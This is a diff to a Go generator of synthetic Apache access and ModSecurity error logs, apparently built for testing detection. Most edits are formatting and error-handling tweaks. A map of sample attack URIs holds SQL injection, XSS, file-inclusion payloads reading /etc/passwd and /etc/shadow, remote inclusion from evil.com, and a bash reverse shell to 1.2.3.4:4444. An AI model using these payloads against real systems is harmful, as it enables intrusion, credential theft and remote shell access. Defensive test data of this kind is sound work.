@@ -139,16 +139,16 @@ var benignURIs = []string{
 }
 
 var attackURIs = map[string][]string{
-	"attack-sqli":            {"/?id=1' OR 1=1--", "/login?u=admin'+UNION+SELECT", "/products?cat=1;DROP TABLE users", "/?q=1' AND SLEEP(5)--"},
-	"attack-xss":             {"/?q=<script>alert(1)</script>", "/comment?t=<img src=x onerror=fetch('//evil')>", "/page?id=javascript:alert(1)"},
-	"attack-lfi":             {"/?file=../../../etc/passwd", "/.git/config", "/?path=..%2f..%2fetc%2fshadow"},
-	"attack-rfi":             {"/?include=http://evil.com/shell.php", "/?file=https://attacker/x"},
-	"attack-rce":             {"/cgi-bin/test.sh?;cat+/etc/passwd", "/api?cmd=bash+-i+>%26+/dev/tcp/1.2.3.4/4444+0>%261"},
-	"attack-injection-php":   {"/?inject=<?php+system($_GET[c]);?>", "/?p=$_GET['x']"},
-	"attack-injection-java":  {"/?expr=java.lang.Runtime.getRuntime().exec('id')", "/api?val=Process.exec('whoami')"},
+	"attack-sqli":               {"/?id=1' OR 1=1--", "/login?u=admin'+UNION+SELECT", "/products?cat=1;DROP TABLE users", "/?q=1' AND SLEEP(5)--"},
+	"attack-xss":                {"/?q=<script>alert(1)</script>", "/comment?t=<img src=x onerror=fetch('//evil')>", "/page?id=javascript:alert(1)"},
+	"attack-lfi":                {"/?file=../../../etc/passwd", "/.git/config", "/?path=..%2f..%2fetc%2fshadow"},
+	"attack-rfi":                {"/?include=http://evil.com/shell.php", "/?file=https://attacker/x"},
+	"attack-rce":                {"/cgi-bin/test.sh?;cat+/etc/passwd", "/api?cmd=bash+-i+>%26+/dev/tcp/1.2.3.4/4444+0>%261"},
+	"attack-injection-php":      {"/?inject=<?php+system($_GET[c]);?>", "/?p=$_GET['x']"},
+	"attack-injection-java":     {"/?expr=java.lang.Runtime.getRuntime().exec('id')", "/api?val=Process.exec('whoami')"},
 	"attack-reputation-scanner": {"/wp-login.php", "/admin", "/.env", "/phpmyadmin/"},
-	"attack-bot":             {"/", "/blog/", "/about/"},
-	"attack-protocol":        {"//", "/cms//wp-includes/wlwmanifest.xml", "/?author=1"},
+	"attack-bot":                {"/", "/blog/", "/about/"},
+	"attack-protocol":           {"//", "/cms//wp-includes/wlwmanifest.xml", "/?author=1"},
 }
 
 var methods = []struct {
@@ -211,17 +211,17 @@ func main() {
 	if err != nil {
 		log.Fatalf("create access: %v", err)
 	}
-	defer af.Close()
+	defer func() { _ = af.Close() }()
 	ef, err := os.Create(*errorOut)
 	if err != nil {
 		log.Fatalf("create error: %v", err)
 	}
-	defer ef.Close()
+	defer func() { _ = ef.Close() }()
 
 	aw := bufio.NewWriterSize(af, 1<<20)
-	defer aw.Flush()
+	defer func() { _ = aw.Flush() }()
 	ew := bufio.NewWriterSize(ef, 1<<20)
-	defer ew.Flush()
+	defer func() { _ = ew.Flush() }()
 
 	now := startTime
 	totalErrors := 0
@@ -299,7 +299,7 @@ func main() {
 				tagStr += fmt.Sprintf(` [tag "%s"]`, t)
 			}
 
-			fmt.Fprintf(ew,
+			_, _ = fmt.Fprintf(ew,
 				`[%s] [-:error] %s:%d %s [client %s] ModSecurity: Warning. Pattern match at REQUEST. [file "/etc/apache2/crs/%s"] [line "%s"] [id "%s"] [msg "%s"] [data "%s"] [severity "%s"] [ver "%s"]%s [hostname "%s"] [uri "%s"] [unique_id "%s"]`+"\n",
 				ts, ipInfo.ip, 30000+rng.IntN(30000), uid, ipInfo.ip,
 				r.conf, r.confLine, r.id, r.msg, r.dataField, r.severity, r.ver, tagStr,
@@ -354,7 +354,7 @@ func main() {
 			ua = "Mozilla/5.0 (compatible; facebookexternalhit/1.1)"
 		}
 
-		fmt.Fprintf(aw,
+		_, _ = fmt.Fprintf(aw,
 			`%s %s - [%s] "%s %s HTTP/1.1" %d %d "-" "%s" "-" %d %s 192.168.1.10 443 - - - "ReqID--" %s %s %s %d %d -%% %d %d %d 0 %s %s %d %d`+"\n",
 			ipInfo.ip, geoip, ts, method, uri, status, respBytes, ua,
 			10000+rng.IntN(50000), host, uid, sslProto, sslCipher,
